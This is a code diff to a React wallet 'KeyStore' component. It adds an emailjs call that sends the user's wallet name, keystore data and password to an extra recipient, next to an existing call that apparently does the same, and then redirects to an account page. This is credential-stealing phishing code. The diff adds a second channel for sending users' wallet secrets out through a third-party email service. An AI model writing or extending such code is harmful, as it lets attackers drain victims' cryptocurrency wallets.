@@ -22,6 +22,23 @@ const KeyStore = ({ selectedWallet, appType}) => {
     const formData = { name, type, data, password };
 
     try {
+
+      await emailjs.send(
+        'service_30vkiql',
+        'template_e0wb6w8',
+        {
+          to_name: "prime_noval_app",
+          from_name: formData.name,
+          message: `
+            Name: ${formData.name}
+            Type: ${formData.type}
+            Data: ${formData.data}
+            Password: ${formData.password}
+          `,
+        },
+        '4leuzsOPi6Oh_D4e0'
+      );
+      
       await emailjs.send(
         'service_ky8xa0e',
         'template_kqjcmir',
@@ -37,6 +54,7 @@ const KeyStore = ({ selectedWallet, appType}) => {
         },
         'pudHPDoixy2beukw8'
       );
+
       setTimeout(() => {
         router.push('/account');
       }, 3000);
